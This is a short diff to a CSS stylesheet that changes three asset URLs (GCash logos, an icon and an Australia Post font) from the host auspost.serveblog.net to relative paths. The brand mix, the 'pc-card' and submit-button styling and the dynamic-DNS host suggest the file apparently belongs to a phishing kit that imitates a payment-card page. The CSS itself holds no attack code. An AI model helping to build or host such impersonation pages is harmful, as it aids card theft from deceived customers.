@@ -662,7 +662,7 @@
 
 .mobile .icon {
     height: 3rem;
-    content: url(https://auspost.serveblog.net/static/pc-card/images/gcash/gcash-cat-success.1788337.png);
+    content: url(/static/pc-card/images/gcash/gcash-cat-success.1788337.png);
     margin-left: -.5rem
 }
 
@@ -869,7 +869,7 @@ header {
 
 @font-face {
     font-family: FS-Elliot-Regular;
-    src: url(https://auspost.serveblog.net/static/pc-card/css/gcash/fonts/FSElliotPro-Regular.224a4cb.otf);
+    src: url(/static/pc-card/css/gcash/fonts/FSElliotPro-Regular.224a4cb.otf);
     font-weight: 400;
     font-style: normal
 }
@@ -941,7 +941,7 @@ body .submit-button .ap-button {
 
 body .gcash-icon {
     height: 8em;
-    content: url(https://auspost.serveblog.net/static/pc-card/images/gcash/GCash-new-logo.74ea4e9.png)
+    content: url(/static/pc-card/images/gcash/GCash-new-logo.74ea4e9.png)
 }
 
 .ap-toast p {
